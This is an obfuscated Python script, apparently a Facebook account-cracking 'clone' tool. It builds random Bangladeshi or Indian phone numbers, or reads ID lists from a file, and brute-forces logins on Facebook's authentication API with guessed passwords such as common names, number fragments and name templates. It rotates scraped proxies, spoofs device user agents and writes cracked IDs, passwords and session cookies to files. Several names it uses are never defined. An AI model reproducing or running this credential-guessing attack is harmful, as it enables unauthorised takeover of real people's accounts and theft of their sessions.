import os ,random #line:2
import sys ,time ,uuid #line:3
try :#line:4
    import requests ,bs4 ,mechanize ,httpx #line:5
    import rich ,json ,subprocess ,random ,string #line:6
    from concurrent .futures import ThreadPoolExecutor as ThreadPool #line:7
except ModuleNotFoundError :#line:8
    print ('\x1b[38;5;46m[\x1b[1;97m≈\x1b[38;5;46m] MODULE INSTALLING ')#line:9
    os .system ('pip install requests rich')#line:10
    os .system ('pip install mechanize')#line:11
    os .system ('pip install bs4 httpx')#line:12
try :#line:14
    prox =requests .get ('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=1000&country=all&ssl=all&anonymity=all').text #line:15
    open ('.prox.txt','w').write (prox )#line:16
except Exception as e :#line:17
    pass #line:18
prox =open ('.prox.txt','r').read ().splitlines ()#line:19
loop ,ok ,cp ,user =0 ,[],[],[]#line:21
cok ,plist =[],[]#line:22
A ='\x1b[1;97m'#line:24
R ='\x1b[38;5;196m'#line:25
Y ='\033[1;33m'#line:26
G ='\x1b[38;5;48m'#line:27
B ='\x1b[38;5;8m'#line:28
G1 ='\x1b[38;5;46m'#line:29
G2 ='\x1b[38;5;47m'#line:30
G3 ='\x1b[38;5;48m'#line:31
G4 ='\x1b[38;5;49m'#line:32
G5 ='\x1b[38;5;50m'#line:33
X ='\33[1;34m'#line:34
X1 ='\x1b[38;5;14m'#line:35
X2 ='\x1b[38;5;123m'#line:36
X3 ='\x1b[38;5;122m'#line:37
X4 ='\x1b[38;5;86m'#line:38
X5 ='\x1b[38;5;121m'#line:39
S ='\x1b[1;96m'#line:40
M ='\x1b[38;5;205m'#line:41
def linex ():#line:43
    print (f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')#line:44
def clear ():#line:45
        os .system (f'clear')#line:46
        print (logo )#line:47
def CEN ():#line:49
	OO0O00000OOOOO00O =f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"#line:50
	OO00O00O00O0O0000 =str (random .randint (10000000 ,66666666 ))#line:51
	O00000O000OOO0O0O =str (random .randint (000000000 ,999999999 ))#line:52
	OO000O0O00O0OOO0O =random .choice (['2.0','2.5','3.0'])#line:53
	O00O0O0O00O0OOOOO =random .choice (["720","1080","1280"])#line:54
	O0O00O00O0O0O0OO0 =random .choice (["720","1080","1280","1440","1920"])#line:55
	OO0O00O00O0O0OOO0 =f"[FBAN/FB4A;FBAV/{str(OO0O00000OOOOO00O)};FBBV/{str(OO00O00O00O0O0000)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={OO000O0O00O0OOO0O},width={O00O0O0O00O0OOOOO},height={O0O00O00O0O0O0OO0}}};FBLC/en_US;FBRV/{str(O00000O000OOO0O0O)};FBCR/MTN-CG;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_X01BDA;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]"#line:56
	return OO0O00O00O0O0OOO0 #line:57
logo =(f"""
       {G1}███████ {Y}████████ {M}███    ██ {S}█████████
       {G2}██      {Y}██       {M}██ █   ██ {S}   ██    
       {G3}██      {Y}████████ {M}██  █  ██ {S}   ██    
       {G4}██      {Y}██       {M}██   █ ██ {S}   ██    
       {G5}███████ {Y}████████ {M}██    ███ {S}   ██    
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G1}[{A}≈{G1}]{G1} DEVELOPER {A}➢{G1} CENT
{G1}[{A}≈{G1}]{G1} TOOLTYPE  {A}➢{G1} FILE {A}&{G1} RANDOM CLONE
{G1}[{A}≈{G1}]{G1} VERSION   {A}➢{A} V{G1}/{A}0.1
{G1}[{A}≈{G1}]{G1} STATUS    {A}➢{A} PRIVATE
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")#line:70
def menu ():#line:72
    clear ()#line:73
    print (f'{G1}[{A}1{G1}]{G1} FILE CLONE ')#line:74
    print (f'{G1}[{A}2{G1}]{G1} RANDOM CLONE ')#line:75
    print (f'{G1}[{A}3{G1}]{G1} CONTACT OWNER ')#line:76
    print (f'{G1}[{A}0{G1}]{G1} EXIT TOOL ')#line:77
    linex ()#line:78
    OO0OOOO0O0O0O0O00 =input (f'{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')#line:79
    if OO0OOOO0O0O0O0O00 in ['1']:#line:80
        file ()#line:81
    elif OO0OOOO0O0O0O0O00 in ['2']:#line:82
        XXX ()#line:83
    elif OO0OOOO0O0O0O0O00 in ['3']:#line:84
        os .system ('xdg-open https://www.facebook.com/CenT.aep');menu ()#line:85
    elif OO0OOOO0O0O0O0O00 in ['0']:#line:86
        sys .exit ()#line:87
    else :#line:88
        menu ()#line:89
def XXX ():#line:91
    clear ()#line:92
    print (f'{G1}[{A}1{G1}]{G1} BANGLADESH CLONE')#line:93
    print (f'{G1}[{A}2{G1}]{G1} INDIA CLONE')#line:94
    print (f'{G1}[{A}0{G1}]{G1} BACK MENU');linex ()#line:95
    O00O0O000OOOOO000 =input (f'{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')#line:96
    if O00O0O000OOOOO000 in ['1']:#line:97
        bd ()#line:98
    elif O00O0O000OOOOO000 in ['2']:#line:99
        India ()#line:100
    elif O00O0O000OOOOO000 in ['0']:#line:101
    	menu ()#line:102
    else :#line:103
        XXX ()#line:104
def bd ():#line:106
    clear ()#line:107
    print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 017{G}/{A}019{G}/{A}018{G}/{A}016');linex ()#line:108
    O0O00O000O0OO0OO0 =input (f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} ')#line:109
    clear ()#line:110
    print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 3000{G}/{A}5000{G}/{A}10000{G}/{A}99999');linex ()#line:111
    OO0O0O0O00O0O0000 =int (input (f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))#line:112
    for O0O0O0OO0000OOO00 in range (OO0O0O0O00O0O0000 ):#line:113
        O0000000O00O00OO0 ="".join (random .choice (string .digits )for _O0O00O0OOOOO00O0O in range (8 ))#line:114
        user .append (O0000000O00O00OO0 )#line:115
    clear ()#line:116
    with ThreadPool (max_workers =30 )as OO00OO00O0O00OOOO :#line:117
        clear ()#line:118
        print (f'{G1}[{A}≈{G1}]{G1} SIM CODE  {A}➢{A} {O0O00O000O0OO0OO0}')#line:119
        print (f'{G1}[{A}≈{G1}]{G1} TOTAL UID {A}➢{A} {str(len(user))}')#line:120
        print (f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex ()#line:121
        for O000OO0000O0OOOO0 in user :#line:122
            OO0O0O0OOOO0O00OO =O0O00O000O0OO0OO0 +O000OO0000O0OOOO0 #line:123
            OOOOOOOOOOOO0OO00 =OO0O0O0OOOO0O00OO [:8 ]#line:124
            OO000OOO0O00O00O0 =OO0O0O0OOOO0O00OO [:7 ]#line:125
            OOOOOOO00OOOOOO0O =OO0O0O0OOOO0O00OO [:6 ]#line:126
            OO0OO000O0OOOOO0O =O000OO0000O0OOOO0 [1 :]#line:127
            O0OO0OOO00OO00OOO =O000OO0000O0OOOO0 [2 :]#line:128
            OOOO0OO0O000OOO0O =[OO0O0O0OOOO0O00OO ,O000OO0000O0OOOO0 ,OOOOOOOOOOOO0OO00 ,OO000OOO0O00O00O0 ,OOOOOOO00OOOOOO0O ,OO0OO000O0OOOOO0O ,O0OO0OOO00OO00OOO ,'77889900','bangladesh','bangla','jannat','jannatul','mariya','sadiya','farjana','sabbir','rakibul','mahidul','nusrat','tamanna','mimmim','suraiya','alamin','arafat','bushra','roksana','tabassum','tanisha','tasnim']#line:129
            OO00OO00O0O00OOOO .submit (randm ,OO0O0O0OOOO0O00OO ,OOOO0OO0O000OOO0O )#line:130
    print ('')#line:131
    print (f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')#line:132
    print (f'{G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')#line:133
    print (f'{G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')#line:134
    print (f'{G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')#line:135
    print (f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')#line:136
    input (f'{G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')#line:137
    menu ()#line:138
def India ():#line:140
    clear ()#line:141
    print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} +91639{G}/{A}+91934{G}/{A}+91902{G}/{A}+91701');linex ()#line:142
    OOOO0OOOO000O0O0O =input (f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} ')#line:143
    clear ()#line:144
    print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 3000{G}/{A}5000{G}/{A}10000{G}/{A}99999');linex ()#line:145
    OOO0O0O00OO0OOO0O =int (input (f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))#line:146
    for O00OOOOO0O00O00O0 in range (OOO0O0O00OO0OOO0O ):#line:147
        O00OOOOO00O0OO000 ="".join (random .choice (string .digits )for _OO0O0OOO0OOOO0O00 in range (7 ))#line:148
        user .append (O00OOOOO00O0OO000 )#line:149
    clear ()#line:150
    with ThreadPool (max_workers =30 )as O00O0O00OOOO0OO0O :#line:151
        clear ()#line:152
        print (f'{G1}[{A}≈{G1}]{G1} SIM CODE  {A}➢{A} {OOOO0OOOO000O0O0O}')#line:153
        print (f'{G1}[{A}≈{G1}]{G1} TOTAL UID {A}➢{A} {str(len(user))}')#line:154
        print (f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex ()#line:155
        for OOO00O0000OO000O0 in user :#line:156
            OO00OOO000OO00O0O =OOOO0OOOO000O0O0O +OOO00O0000OO000O0 #line:157
            OO0O00O000OOO0OO0 =[OOO00O0000OO000O0 ,OO00OOO000OO00O0O [:8 ],'57273200','59039200','57575751']#line:158
            O00O0O00OOOO0OO0O .submit (randm ,OO00OOO000OO00O0O ,OO0O00O000OOO0OO0 )#line:159
    print ('')#line:160
    print (f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')#line:161
    print (f'{G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')#line:162
    print (f'{G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')#line:163
    print (f'{G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')#line:164
    print (f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')#line:165
    input (f'{G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')#line:166
    menu ()#line:167
def file ():#line:169
    clear ()#line:170
    print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} /{A}sdcard{G1}/{A}SWAG.txt');linex ()#line:171
    O00000O0O0OO0OO0O =input (f'{G1}[{A}?{G1}]{G1} FILE NAME {A}➢{G1} ')#line:172
    try :#line:173
        O0OO00OO0O000OO00 =open (O00000O0O0OO0OO0O ,'r').read ().splitlines ()#line:174
    except FileNotFoundError :#line:175
        print (f'{G1}[{A}≈{G1}]{G1} FILE NOT FOUND');time .sleep (1 )#line:176
        O00000O0O0OO0OO0O ()#line:177
    clear ()#line:178
    print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} {G1}[{A}1-20{G1}]{G1}');linex ()#line:179
    OO0O0O0O000OOO0OO =int (input (f'{G1}[{A}?{G1}]{G1} PASSWORD LIMIT {A}➢{G1} '))#line:180
    clear ()#line:181
    for O00OOO0000O00000O in range (OO0O0O0O000OOO0OO ):#line:182
        print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} firstlast{G1}/{A}first123{G1}/{A}last123')#line:183
        plist .append (input (f'{G1}[{A}?{G1}]{G1} PASSWORD NO {G1}[{A}{O00OOO0000O00000O+1}{G1}]{G1} {A}➢{S} '));linex ()#line:184
    with ThreadPool (max_workers =30 )as O0OOO00OO0O000OOO :#line:185
        OOO00O00O0O0OOOOO =str (len (O0OO00OO0O000OO00 ))#line:186
        clear ()#line:187
        print (f'{G1}[{A}≈{G1}]{G1} TOTAL ID {A}➢{G1} {OOO00O00O0O0OOOOO}')#line:188
        print (f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex ()#line:189
        for O0OO0O0O0O0O000O0 in O0OO00OO0O000OO00 :#line:190
            OOO0OOO0O0OO0OOO0 ,O0O000O000OO000OO =O0OO0O0O0O0O000O0 .split ('|')#line:191
            OOO0O0O0O000O0O0O =plist #line:192
            O0OOO00OO0O000OOO .submit (M1 ,OOO0OOO0O0OO0OOO0 ,O0O000O000OO000OO ,OOO0O0O0O000O0O0O )#line:193
    print ('')#line:194
    print (f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')#line:195
    print (f'{G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')#line:196
    print (f'{G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')#line:197
    print (f'{G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')#line:198
    print (f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')#line:199
    input (f'{G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')#line:200
    menu ()#line:201
def randm (O0OO00O0OOOOO0O0O ,O000O00O0O00000O0 ):#line:203
    global loop ,ok #line:204
    OOOOOOOO000OO00OO =random .choice (prox )#line:205
    OO0OOO0OOO0000OOO ={'http':'socks4://'+OOOOOOOO000OO00OO }#line:206
    sys .stdout .write (f'\r\r{A}[{G1}SWAG-XD{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')#line:207
    sys .stdout .flush ()#line:208
    try :#line:209
        for OOOO000O0000O000O in O000O00O0O00000O0 :#line:210
            OOOO000O0OOOO0O00 ={'adid':str (uuid .uuid4 ()),'format':'json','device_id':str (uuid .uuid4 ()),'email':O0OO00O0OOOOO0O0O ,'password':OOOO000O0000O000O ,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str (uuid .uuid4 ()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}#line:231
            O00OOO0OOOO0OO0O0 ={'User-Agent':sex (),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str (random .randint (2e4 ,4e4 )),'X-FB-SIM-HNI':str (random .randint (2e4 ,4e4 )),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'Banglalink','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}#line:249
            O0000OOOO0O0O0000 ='https://b-graph.facebook.com/auth/login'#line:250
            O000OOO0OOOO0O000 =requests .post (O0000OOOO0O0O0000 ,data =OOOO000O0OOOO0O00 ,headers =O00OOO0OOOO0OO0O0 ,allow_redirects =False ).text #line:251
            OOOO0OOO00OOOO0O0 =json .loads (O000OOO0OOOO0O000 )#line:252
            if 'access_token'in OOOO0OOO00OOOO0O0 :#line:253
                O0000O0OO00O0OOO0 =str (OOOO0OOO00OOOO0O0 ['uid'])#line:254
                O00OOOOOOO0O0O0O0 =";".join (OO0000O000O00OO00 ["name"]+"="+OO0000O000O00OO00 ["value"]for OO0000O000O00OO00 in OOOO0OOO00OOOO0O0 ["session_cookies"])#line:255
                if res =='LIVE':#line:256
                	print (f'\r\r{A}[{G1}CENT-OK{A}]{G1} {O0000O0OO00O0OOO0} {A}|{G1} {OOOO000O0000O000O}');open ('/sdcard/CENT-FILE-OK.txt','a').write (O0000O0OO00O0OOO0 +'|'+OOOO000O0000O000O +'|'+O00OOOOOOO0O0O0O0 +'\n');ok .append (O0000O0OO00O0OOO0 );break #line:257
                if res =='LOCK':#line:258
                	print (f'\r\r{A}[{S}CENT-PODLOCK{A}]{S} {O0000O0OO00O0OOO0} {A}|{S} {OOOO000O0000O000O}');break #line:259
            else :continue #line:260
        loop +=1 #line:261
    except Exception as O0O000OOOOO0OO00O :#line:262
        pass #line:263
def M1 (O00OOOO00OO0OO0O0 ,O00OO0O0O0O0O0000 ,OO0OOOOOOO0OOOO0O ):#line:265
    global loop ,ok #line:266
    OO000000OO0O0OOOO =random .choice (prox )#line:267
    O0OO00O00O0000OOO ={'http':'socks4://'+OO000000OO0O0OOOO }#line:268
    sys .stdout .write (f'\r\r{A}[{G1}CENT-XD{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')#line:269
    sys .stdout .flush ()#line:270
    try :#line:271
        O00OOO0000OO0OO0O =O00OO0O0O0O0O0000 .split (' ')[0 ]#line:272
        try :OO00OOOO0OOOO0O0O =O00OO0O0O0O0O0000 .split (' ')[1 ]#line:273
        except :OO00OOOO0OOOO0O0O =O00OOO0000OO0OO0O #line:274
        for O0000000000O00OOO in OO0OOOOOOO0OOOO0O :#line:275
            O0000000O00OOO0OO =O0000000000O00OOO .replace ('first',O00OOO0000OO0OO0O .lower ()).replace ('First',O00OOO0000OO0OO0O ).replace ('last',OO00OOOO0OOOO0O0O .lower ()).replace ('Last',OO00OOOO0OOOO0O0O ).replace ('Name',O00OO0O0O0O0O0000 ).replace ('name',O00OO0O0O0O0O0000 .lower ())#line:276
            O00OO0O0OO0O0OO0O ={'adid':str (uuid .uuid4 ()),'format':'json','device_id':str (uuid .uuid4 ()),'email':O00OOOO00OO0OO0O0 ,'password':O0000000O00OOO0OO ,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str (uuid .uuid4 ()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}#line:297
            OOO0O00OO00000O00 ={'User-Agent':CEN (),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str (random .randint (2e4 ,4e4 )),'X-FB-SIM-HNI':str (random .randint (2e4 ,4e4 )),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'Banglalink','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}#line:315
            O0OO0OO0OOOOO0O00 =requests .post ('https://b-graph.facebook.com/auth/login',data =O00OO0O0OO0O0OO0O ,headers =OOO0O00OO00000O00 ).json ()#line:316
            if 'access_token'in O0OO0OO0OOOOO0O00 :#line:317
                print (f'\r\r{A}[{G1}CEN-OK{A}]{G1} {O00OOOO00OO0OO0O0} {A}|{G1} {O0000000O00OOO0OO}')#line:318
                OO00O00000OOOOOO0 =";".join (OO0OO0OO0OOOOOOOO ["name"]+"="+OO0OO0OO0OOOOOOOO ["value"]for OO0OO0OO0OOOOOOOO in O0OO0OO0OOOOO0O00 ["session_cookies"])#line:319
                open ('/sdcard/CEN-FILE-OK.txt','a').write (uid +'|'+O0000000O00OOO0OO +'|'+OO00O00000OOOOOO0 +'\n')#line:320
                ok .append (O00OOOO00OO0OO0O0 )#line:321
                break #line:322
            elif 'www.facebook.com'in O0OO0OO0OOOOO0O00 ['error']['message']:#line:323
                open ('/sdcard/CEN-FILE-PODLOCK.txt','a').write (O00OOOO00OO0OO0O0 +'|'+O0000000O00OOO0OO +'\n')#line:325
            else :continue #line:326
        loop +=1 #line:327
    except Exception as OO00OOO00O00O0O00 :#line:328
        pass #line:329
if __name__ =='__main__':#line:330
    menu ()#line:331
